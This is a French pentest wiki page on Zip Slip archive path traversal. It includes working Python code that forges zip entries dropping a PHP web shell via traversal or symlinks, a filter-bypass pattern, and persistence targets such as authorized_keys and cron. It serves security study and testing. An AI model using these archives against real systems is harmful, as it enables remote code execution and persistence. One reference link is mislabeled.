---
order: 1
title: "Zip Slip : path traversal par extraction d'archive"
description: "Des entrées d'archive avec des séquences de traversée ou des chemins absolus écrivent hors du répertoire de décompression pendant l'extraction, écrasant des ressources web ou des binaires et implantant des shells."
keywords:
  - zip slip
  - extraction d'archive
  - path traversal
  - écriture de fichier arbitraire
  - symlink
  - tar
---

# Zip Slip

Lorsqu'une application décompresse une archive uploadée sans résoudre le chemin final de chaque entrée, une entrée nommée avec des séquences de traversée ou un chemin absolu est écrite **hors** du répertoire d'extraction prévu. L'attaquant choisit où les octets atterrissent : un script servi par le web, un binaire sur le `PATH`, un fichier cron, ou une configuration que le service lit.

## Le schéma défectueux

Les extracteurs vulnérables joignent le répertoire de destination au nom brut de l'entrée et ne vérifient jamais que le résultat reste à l'intérieur de la destination. En Java, `ZipInputStream` renvoie `entry.getName()` verbatim :

```java
ZipEntry entry = zis.getNextEntry();
File out = new File(destDir, entry.getName());   // "../" is honored
FileOutputStream fos = new FileOutputStream(out); // writes outside destDir
```

Comme `new File(destDir, "../../x")` se résout au-dessus de `destDir`, l'écriture s'échappe. Le code sûr canonicalise `out.getCanonicalPath()` et confirme qu'il commence par le `destDir` canonique, ce que le chemin défectueux omet précisément.

## Forger une entrée de traversée

Les formats d'archive stockent le nom d'entrée comme une simple chaîne, donc les séquences de traversée passent directement. Construisez un zip dont le nom de membre remonte et atterrit sur un fichier servi par le web :

```python
import zipfile
with zipfile.ZipFile('evil.zip', 'w') as z:
    z.writestr('../../../../var/www/html/shell.php',
               '<?php system($_GET["c"]); ?>')
```

À l'extraction, le shell est écrit sous la racine web. Requêtez-le pour l'exécuter :

```
GET /shell.php?c=id HTTP/1.1
```

## Chemins absolus

Certains archiveurs (`tar` plus anciens, et bibliothèques zip qui ne suppriment pas une barre oblique de tête) honorent un nom de membre absolu, abandonnant la danse relative/traversée :

```bash
# tar entry with an absolute path
tar -cf evil.tar -C / -P /var/www/html/shell.php
```

GNU tar a besoin de `-P`/`--absolute-names` pour créer et extraire un tel membre, que certains wrappers côté serveur passent par défaut.

## Cibles d'écriture à forte valeur

Avec une écriture arbitraire, choisissez un chemin qui donne l'exécution ou la persistance :

- `/var/www/html/shell.php` ou le répertoire statique de l'application, pour un web shell.
- `~/.ssh/authorized_keys`, pour ajouter une clé.
- Un dépôt cron tel que `/etc/cron.d/x` pour une exécution de commande planifiée.
- Un binaire ou script existant sur le `PATH` du service, pour détourner la prochaine exécution.
- Écraser les JAR de l'application, `.env`, ou des templates que le processus recharge.

## Variante symlink

Une seconde classe abuse des liens symboliques à l'intérieur de l'archive : une entrée symlink pointant vers un répertoire hors de la racine de décompression, suivie d'une entrée régulière **sous** ce lien, de sorte que l'écriture atterrit à la cible du lien. Les deux entrées doivent être préservées dans l'ordre, ce qu'un double ajout `zip` ne fait pas (il met à jour le membre existant), donc construisez l'archive avec un outil qui conserve des entrées ordonnées :

```python
import zipfile
z = zipfile.ZipFile("evil.zip", "w")
# 1) a symlink entry 'evil' -> /var/www/html
info = zipfile.ZipInfo("evil"); info.external_attr = (0o120777) << 16
z.writestr(info, "/var/www/html")
# 2) a regular entry written through it
z.writestr("evil/shell.php", "<?php system($_GET['c']); ?>")
z.close()
```

Sur les extracteurs qui recréent le symlink avant d'écrire les membres suivants, `evil/shell.php` est écrit à travers le lien dans `/var/www/html`. Les variantes orientées lecture pointent le symlink vers `/etc/passwd` de sorte qu'un aperçu ultérieur ou un re-téléchargement du chemin archivé renvoie le contenu de la cible du lien.

## Archives imbriquées et mixtes

Les noms fortement préfixés (`....//....//`) viennent à bout de la suppression naïve de `../` en une seule passe, car retirer un `../` laisse une autre séquence valide :

```
....//....//....//var/www/html/shell.php
```

Les mêmes noms d'entrées fonctionnent à travers zip, tar, jar, war, et de nombreux décompresseurs spécifiques à un langage, puisque la faille est dans le code d'extraction, pas dans le format.

## Outils

- **[Burp Suite](https://portswigger.net/burp)** : Repeater pour uploader des archives forgées.
- **[evilarc](https://github.com/ptoomey3/evilarc)** : génère des archives avec des entrées de path traversal.
- Forge manuelle d'archives avec les modules Python `zipfile` et `tarfile`.

## Références

- [OWASP: Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
- [PayloadsAllTheThings: Zip Slip](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Deserialization)
- [Snyk Zip Slip research](https://security.snyk.io/research/zip-slip-vulnerability)
